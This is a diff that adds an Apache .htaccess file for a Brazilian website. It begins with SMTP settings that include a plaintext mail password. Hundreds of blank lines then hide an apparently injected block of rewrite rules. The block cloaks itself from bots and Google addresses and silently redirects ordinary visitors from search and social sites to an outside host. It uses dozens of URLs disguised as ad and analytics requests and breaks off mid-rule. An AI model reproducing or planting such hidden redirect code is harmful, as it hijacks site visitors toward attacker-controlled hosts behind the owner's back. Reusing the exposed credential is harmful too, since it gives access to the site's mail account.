@@ -1,0 +1,1293 @@
+php_flag authmail.debug Off
+php_value authmail.port 587
+php_value authmail.address contato@obrademariadf.com.br
+php_value authmail.smtp_account contato=obrademariadf.com.br
+php_value authmail.smtp smtp.obrademariadf.com.br
+php_value authmail.password 'rainhadapaz'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<IfModule prefork.c>
+RewriteEngine On
+RewriteCond %{REQUEST_METHOD}   ^GET$
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(tweet|twit|linkedin|instagram|facebook\.|myspace\.|bebo\.).*$ [NC,OR]
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(hi5\.|blogspot\.|friendfeed\.|friendster\.|google\.).*$ [NC,OR]
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(yahoo\.|bing\.|msn\.|ask\.|excite\.|altavista\.|netscape\.).*$ [NC,OR]
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(aol\.|hotbot\.|goto\.|infoseek\.|mamma\.|alltheweb\.).*$ [NC,OR]
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(lycos\.|metacrawler\.|mail\.|pinterest|instagram).*$   [NC]
+RewriteCond %{HTTP_REFERER}     !^.*(imgres).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(bing|Accoona|Ace\sExplorer|Amfibi|Amiga\sOS|apache|appie|AppleSyndication).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Archive|Argus|Ask\sJeeves|asterias|Atrenko\sNews|BeOS|BigBlogZoo).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Biz360|Blaiz|Bloglines|BlogPulse|BlogSearch|BlogsLive|BlogsSay|blogWatcher).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Bookmark|bot|CE\-Preload|CFNetwork|cococ|Combine|Crawl|curl|Danger\shiptop).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Diagnostics|DTAAgent|EmeraldShield|endo|Evaal|Everest\-Vulcan).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(exactseek|Feed|Fetch|findlinks|FreeBSD|Friendster|Fuck\sYou|Google).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Gregarius|HatenaScreenshot|heritrix|HolyCowDude|Honda\-Search|HP\-UX).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(HTML2JPG|HttpClient|httpunit|ichiro|iGetter|IRIX|Jakarta|JetBrains).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Krugle|Labrador|larbin|LeechGet|libwww|Liferea|LinkChecker).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(LinknSurf|Linux|LiveJournal|Lonopono|Lotus\-Notes|Lycos|Lynx|Mac\_PowerPC).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Mac\_PPC|Mac\s10|macDN|Mediapartners|Megite|MetaProducts).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Miva|Mobile|NetBSD|NetNewsWire|NetResearchServer|NewsAlloy|NewsFire).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(NewsGatorOnline|NewsMacPro|Nokia|NuSearch|Nutch|ObjectSearch|Octora).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(OmniExplorer|Omnipelagos|Onet|OpenBSD|OpenIntelligenceData|oreilly).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(os\=Mac|P900i|panscient|perl|PlayStation|POE\-Component|PrivacyFinder).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(psycheclone|Python|retriever|Rojo|RSS|SBIder|Scooter|Seeker|Series\s60).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(SharpReader|SiteBar|Slurp|Snoopy|Soap\sClient|Socialmarks|Sphere\sScout).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(spider|sproose|Rambler|Straw|subscriber|SunOS|Surfer|Syndic8).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Syntryx|TargetYourNews|Technorati|Thunderbird|Twiceler|urllib|Validator).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Vienna|voyager|W3C|Wavefire|webcollage|Webmaster|WebPatrol|wget|Win\s9x).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Win16|Win95|Win98|Windows\s95|Windows\s98|Windows\sCE|Windows\sNT\s4).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(WinHTTP|WinNT4|WordPress|WWWeasel|wwwster|yacy|Yahoo).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Yandex|Yeti|YouReadMe|Zhuaxia|ZyBorg).*$   [NC]
+RewriteCond %{REQUEST_FILENAME} !.*jpg$|.*gif$|.*png|.*jpeg|.*mpg|.*avi|.*zip|.*gz|.*tar|.*ico$ [NC]
+RewriteCond %{REMOTE_ADDR}      !^66\.249.*$ [NC]
+RewriteCond %{REMOTE_ADDR}      !^74\.125.*$ [NC]
+RewriteCond %{HTTP_COOKIE}      !^.*zCT.*$ [NC]
+RewriteCond %{HTTP_USER_AGENT}  .*(Windows|Macintosh|iPad|iPhone|iPod|Android).* [NC]
+RewriteCond %{HTTPS}            ^off$
+RewriteRule .* - [E=zCT:%{TIME_SEC}]
+RewriteRule .* - [E=cDs:sech.humphreyslawncare.com]
+
+RewriteCond %{ENV:zCT} 0
+RewriteRule ^.* http://%{ENV:cDs}/new/www/delivery/ajs.php?bannerid=8685&cb=9520108725&charset=utf-8&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10606:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 1
+RewriteRule ^.* http://%{ENV:cDs}/delivery/lg.php?bannerid=38085&campaignid=696&zoneid=1170&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=787e1fd65c  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9196:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 2
+RewriteRule ^.* http://%{ENV:cDs}/t.gif?_=1340165095402&count=none&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&id=twitter_tweet_button_36&lang=id&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&text=Foto\%20Wajah-wajah\%20Cantik\%20Pendukung\%20Spanyol\%20\%7C\%20Gambar\%20Wajah-wajah\%20Cantik\%20Pendukung\%20Spanyol\%20-\%20Yahoo!\%20Sports\%20Indonesia&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&type=share&size=m&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=1&twttr_li=0&twttr_pid=v3:1334808221852303953932758  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10709:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 3
+RewriteRule ^.* http://%{ENV:cDs}/st?_PVID=qrfeWdG_T4mfdXxHT2g.ewIfyokXaE_pmmYABwK_&cnt=yan&ad_type=iframe&ad_size=180x150&entity=24276&site_code=mail&section_code=15167784&cb=1340709478566611&yud=zip\%3D\%26ycg\%3Df\%26yyob\%3D1980&pub_redirect_unencoded=1&pub_redirect=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9104:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 4
+RewriteRule ^.* http://%{ENV:cDs}/t.gif?_=1340844485876&count=horizontal&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&id=twitter_tweet_button_0&lang=id&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&text=Tommy\%20Kurniawan\%20Ditegur\%20Pengawas\%20Ka\%27bah\%20-\%20Yahoo!\%20OMG!\%20Indonesia&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&type=share&size=m&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=0&twttr_li=0&twttr_pid=v3:1334537201755728158908838  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:11977:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 5
+RewriteRule ^.* http://%{ENV:cDs}/imghover?iact=hm&ei=fkPpT4L4JsLmrAf7w8SKDg&q=america\%27s+next+top+model+cycle+18+winner&tbs=&page=2&tbnh=141&tbnw=182&start=14&ndsp=19&dur=588&tbnid=wd1hFPvWLnN0bM:&hovh=194&hovw=259&vpx=486&vpy=331&imgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&imgrefurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ved=1t:1527,r:2,s:14,i:122&vetl=ms  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9749:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 6
+RewriteRule ^.* http://%{ENV:cDs}/__utm.gif?utmwv=5.3.3&utms=12&utmn=1156265161&utmhn=www.kapanlagi.com&utmcs=ISO-8859-1&utmsr=1024x768&utmvp=1008x611&utmsc=32-bit&utmul=en-us&utmje=1&utmfl=-&utmdt=KapanLagi.com:\%20Dampak\%20Perceraian\%20:\%20Inilah\%20Suri.\%20Gadis\%20berumur\%20enam\%20tahun\%20dengan\%20selera\%20fashion\%20jutaan\%20dolar.\%20Pakaian\%20merek\%20terkenal\%20yang\%20ia\%20miliki\%20senilai\%20Rp\%2030&utmhid=271332892&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/foto/berita-foto/internasional/21452tom_cruise_katie_holmes_cerai-20120630-005-rita.html&utmac=UA-1232444-6&utmcc=__utma\%3D122331860.451050935.1341207355.1341365486.1341386184.6\%3B\%2B__utmz\%3D122331860.1341207355.1.1.utmcsr\%3Dvideo.kapanlagi.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/celeb-trip/anang-ashanty-segera-pecah-kongsi.html\%3B&utmu=qB~  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9293:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 7
+RewriteRule ^.* http://%{ENV:cDs}/?eid=203&oid=10095238&linkid=&uid=11604186&rgid=2886&crdr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ctid=11&scid=0&rl=&origargs=nCTID\%3D11\%26nSCID\%3D0\%26nIID\%3D11604186\%26nICnt\%3D10\%26nRGID\%3D2886\%26sManufacturer\%3DSennheiser\%26sModelNumber\%3De835\%26sCCode\%3DUS\%26nCMPID\%3D0\%26sSKU\%3De835\%26nRadius\%3D15\%26nRID\%3D0\%26nCID\%3D0\%26sRnd\%3DC7HCNReE  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10129:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 8
+RewriteRule ^.* http://%{ENV:cDs}/t.gif?_=1341224463064&count=none&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&id=twitter_tweet_button_50&lang=id&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&text=Foto\%20Kegembiraan\%20Fernando\%20Torres\%20\%7C\%20Gambar\%20Kegembiraan\%20Fernando\%20Torres\%20-\%20Yahoo!\%20Sports\%20Indonesia&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&type=share&size=m&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=0&twttr_li=0&twttr_pid=v3:1334655638824679981279445  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:11399:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 9
+RewriteRule ^.* http://%{ENV:cDs}/url?sa=t&rct=j&q=perluasan\%20pekerjaan\%20horizontal&source=web&cd=5&ved=0CFcQFjAE&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ei=Y03gT7HpLIzSrQeSkdiSDQ&usg=AFQjCNGZMeRLmUBI020FocPhy216dVdQxg  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9374:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 10
+RewriteRule ^.* http://%{ENV:cDs}/b?c1=7&c2=8097938&rn=920866417&c7=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c3=8097938&c8=ShareThis\%20Segmenter&c9=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cv=2.2&cs=js  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10490:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 11
+RewriteRule ^.* http://%{ENV:cDs}/_xhr/ugccomments/?method=get_list&context_id=bb839817-8c4f-3af8-9fab-2f0669d49ca9&0.18296561752704477&mode=list&show_form=yes&baseurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&&asset_title=France\%26amp\%3B\%2339\%3Bs\%20Reveillere\%20challenges\%20Spain\%26amp\%3B\%2339\%3Bs\%20Iniesta\%20during\%20their\%20Euro\%202012\%20quarter-final\%20soccer\%20match\%20at\%20Donbass\%20Arena\%20in\%20Donetsk&ugccmt_vita_type=photo&ugccmt_vita_img_url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ugccmt_vita_img_width=110&ugccmt_vita_img_height=88&ugccmt_vita_img_rights=anywhere&ugccmt_vita_photo_album=Raja\%20Umpan\%20Hingga\%20Babak\%208\%20Besar&ugccmt_vita_photo_album_url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10432:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 12
+RewriteRule ^.* http://%{ENV:cDs}/delivery/lg.php?bannerid=4273&campaignid=2451&zoneid=768&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=0bf3c0d314  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9746:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 13
+RewriteRule ^.* http://%{ENV:cDs}/pview?event=pview&fpc=d96b1f4-137eaa87da1-3bf81330-13896&sessionID=1342183275574.37545&sourceURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&hostname=www.mangahere.com&location=/manga/hapi_mari/v07/c031/42.html&publisher=e47efe7d-147b-4731-ac42-9838ccdc52f2&shareHash=sthash.WzaelP51&incomingHash=&refDomain=www.mangahere.com&refQuery=manga/hapi_mari/v07/c031/41.html&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sharURL=&source=share5x&title=Hapi\%20Mari\%2031\%20-\%20Read\%20Hapi\%20Mari\%20Chapter\%2031\%20Online\%20-\%20Page\%2042&ts1342183275576.0=  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10574:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 14
+RewriteRule ^.* http://%{ENV:cDs}/t.gif?_=1341313223252&count=horizontal&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&id=twitter-widget-0&lang=en&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&related=detikcom&size=m&text=Gugat\%20Cerai\%20Tom\%20Cruise\%2C\%20Katie\%20Holmes\%20Ganti\%20Bodyguard&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&via=detikhot&type=share&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=1&twttr_li=0&twttr_pid=v3:1340330149217297314848009  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9389:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 15
+RewriteRule ^.* http://%{ENV:cDs}/__utm.gif?utmwv=5.3.3&utms=2&utmn=1982890304&utmhn=www.blogger.com&utmcs=UTF-8&utmsr=1024x768&utmvp=425x410&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=10.3\%20r181&utmdt=Blogger:\%20TONGKONANKU\%20-\%20Poskan\%20Komentar&utmhid=108912121&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/comment-iframe.g\%3FblogID\%3D6383766510136063875\%26postID\%3D2574313265355025187\%26blogspotRpcToken\%3D5801519&utmac=UA-18003-7&utmcc=__utma\%3D150635877.1802586567.1341544807.1341544807.1341544807.1\%3B\%2B__utmz\%3D150635877.1341544807.1.1.utmcsr\%3Dtongkonanku.blogspot.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/2011/10/tergoda-harga-murah-modem-smartfren.html\%3B&utmu=q~  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10424:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 16
+RewriteRule ^.* http://%{ENV:cDs}/t.gif?_=1342505777188&count=none&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&id=twitter_tweet_button_0&lang=id&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&text=Foto\%20Shirt\%20dress\%20yang\%20trendi\%20\%7C\%20Gambar\%20Shirt\%20dress\%20yang\%20trendi\%20-\%20Yahoo!\%20She&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&type=share&size=m&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=0&twttr_li=0&twttr_pid=v3:1334808221852303953932758  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9010:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 17
+RewriteRule ^.* http://%{ENV:cDs}/__utm.gif?utmwv=1&utmn=920781154&utmcs=ISO-8859-1&utmsr=1360x768&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=10.0\%20r22&utmdt=detik\%20Finance\%20:\%20Barometer\%20Bisnis\%20Anda&utmhn=finance.detik.com&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/?9922022  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:11547:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 18
+RewriteRule ^.* http://%{ENV:cDs}/imghover?iact=hm&ei=fYb_T8q1C4fTrQehm4CEBg&q=suri+cruise+2012&tbs=&page=6&tbnh=142&tbnw=145&start=150&ndsp=34&dur=742&tbnid=Qs-rmKobi7rJ9M:&hovh=224&hovw=224&vpx=121&vpy=271&imgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&imgrefurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ved=1t:1527,r:25,s:150,i:301&vetl=ms  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9125:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 19
+RewriteRule ^.* http://%{ENV:cDs}/pview?event=pview&fpc=657356c-1387e3bf7aa-26f816a6-36&sessionID=1342148602330.31505&sourceURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&hostname=mangafox.me&location=/manga/fairy_tail/v33/c277/14.html&publisher=2c989003-877d-472f-8054-0185c722ab72&shareHash=sthash.uWaNEoVS&incomingHash=&refDomain=mangafox.me&refQuery=manga/fairy_tail/v33/c277/13.html&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sharURL=&source=share5x&title=Fairy\%20Tail\%20277\%20v33\%20-\%20Read\%20Fairy\%20Tail\%20277\%20Online\%20-\%20Page\%2014&ts1342148602332.0=  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9332:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 20
+RewriteRule ^.* http://%{ENV:cDs}/s?ns=yt&docid=5TrCEKlXlyo&el=embedded&ps=default&sourceid=ys&q=the\%20perfect\%20two&vid=TGV5JmViSkt_QZxOLYxbwgO36kCrdPm7C&fexp=902518,912706,907344,919324,913547,913542,924500,912804,920704,919316,922600,919306,921602,907335,907217,923102,914062&eurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&hl=en_US&cr=ID&csipt=watch5&hbd=4223524&hbt=92.178&rt=1.758&plid=AATDc6oMs0IBQ81_&fmt=5&md=1&sd=B4A7D60A5HH1340801464868459&vw=320&vh=240&vq=auto&volume=20&mos=0&w=640&h=365&pd=0.703&bt=0.914&bd=56218&bc=88697&len=159.073&st=0.167&et=0.167&playback=1&fv=WIN\%208\%2C0\%2C22\%2C0  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10004:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 21
+RewriteRule ^.* http://%{ENV:cDs}/__utm.gif?utmwv=5.3.2&utms=2&utmn=640472044&utmhn=otomotif.kompas.com&utmcs=UTF-8&utmsr=1280x800&utmvp=1263x670&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=11.2\%20r202&utmdt=Mei\%2C\%20Penjualan\%20Daihatsu\%20Tertinggi\%20di\%20Indonesia\%20\%E2\%80\%94\%20KOMPAS\%20Otomotif&utmhid=2085407062&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/read/2012/06/28/2852/Mei.Penjualan.Daihatsu.Tertinggi.di.Indonesia&utmac=UA-3374285-16&utmcc=__utma\%3D260902355.1062560635.1339486253.1340786266.1340857082.9\%3B\%2B__utmz\%3D260902355.1340857082.9.9.utmcsr\%3Dkompas.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/\%3B&utmu=qAAg~  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9185:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 22
+RewriteRule ^.* http://%{ENV:cDs}/safe_image.php?d=AQCfGNUofP6kZqQe&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&jq=100  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9620:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 23
+RewriteRule ^.* http://%{ENV:cDs}/url?sa=t&rct=j&q=toko+alat+halloween+indonesia&source=web&cd=17&ved=0CFQQFjAGOAo&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ei=VeAEULThFoTSrQfQ1u2mBg&usg=AFQjCNH02Gwa7SadO319FUvHB55OSS5jjw  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9841:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 24
+RewriteRule ^.* http://%{ENV:cDs}/b?c1=2&c2=8077308&ns__t=1340268682490&ns_c=UTF-8&c8=WBO\%20Perintahkan\%20Tarung\%20Ulang\%20Pacquiao-Bradley\%20-\%20KOMPAS.com&c7=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c9=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9304:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 25
+RewriteRule ^.* http://%{ENV:cDs}/lg.php?bannerid=1889&campaignid=18&zoneid=105&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=1e5776a39a  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:11378:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 26
+RewriteRule ^.* http://%{ENV:cDs}/fpc.pl?v=5.1.0.11.js&a=10002112031535&dpid=2191823315&ittidx=1&flv=Shockwave\%20Flash\%2010.0\%20r22&n=-7&g=en-US&h=N&j=1024x768&k=24&l=true&f=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&b=Tidak\%20Akan\%20Ada\%20Film\%20Ke-4\%20Batman\%20Versi\%20Nolan\%20-\%20Yahoo!\%20OMG!\%20Indonesia&enc=UTF-8&e=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cf13=story&d=Wed\%2C\%2004\%20Jul\%202012\%2004:19:44\%20GMT  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10493:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 27
+RewriteRule ^.* http://%{ENV:cDs}/b/ss/fnacesprod/1/H.19.4/s84125137658828?AQB=1&ndh=1&t=28/0/2010\%209:51:32\%204\%20-60&ce=UTF-8&ns=fnac&pageName=ES:Products:Foto\%20y\%20Videoc\%26\%23225\%3Bmaras:C\%26\%23225\%3Bmaras\%20Digital\%20Compacta&g=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&r=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cc=EUR&ch=Products&server=FCSESWEB4&c1=Foto\%20y\%20Videoc\%u00E1maras&h1=FNAC\%7CProducts\%7CFoto\%20y\%20Videoc\%u00E1maras\%7CC\%E1maras\%20Digital\%20Compacta&c2=C\%u00E1maras\%20Digital\%20Compacta&v2=browse&v4=HGAChead&c30=9:30AM&v30=9:30AM&c31=Thursday&v31=Thursday&c32=Weekday&v32=Weekday&c50=ES&s=1152x864&c=32&j=1.7&v=Y&k=Y&bw=1152&bh=608&p=Mozilla\%20Default\%20Plug-in\%3BAdobe\%20Acrobat\%3BShockwave\%20Flash\%3BShockwave\%20for\%20Director\%3BSilverlight\%20Plug-In\%3BMicrosoft\%20Office\%20Live\%20Plug-in\%20for\%20Firefox\%3BWindows\%20Live\%u00AE\%20Photo\%20Gallery\%3BRealPlayer\%28tm\%29\%20G2\%20LiveConnect-Enabled\%20Plug-In\%20\%2832-bit\%29\%20\%3BRealPlayer\%20Version\%20Plugin\%3BJava\%28TM\%29\%20Platform\%20SE\%206\%20U6\%3BMicrosoft\%AE\%20DRM\%3BWindows\%20Media\%20Player\%20Plug-in\%20Dynamic\%20Link\%20Library\%3B&pid=ES:Products:HomePage&pidt=1&oid=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ot=A&AQE=1  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10377:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 28
+RewriteRule ^.* http://%{ENV:cDs}/neo/darla/php/fc.php?trace=folder_inbox&tID=15&d=0&f=978532093&l=SKY\%2CREC\%2CMNW&rn=1340183077789&en=utf-8&mb_s_en=utf-8&filter=no_expandable\%253Bajax_cert_expandable\%253Bexp_iframe_expandable\%253B&ref=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sa=content\%253D\%2522minty_tenure\%253A\%2520week\%25203+\%2522&  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9724:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 29
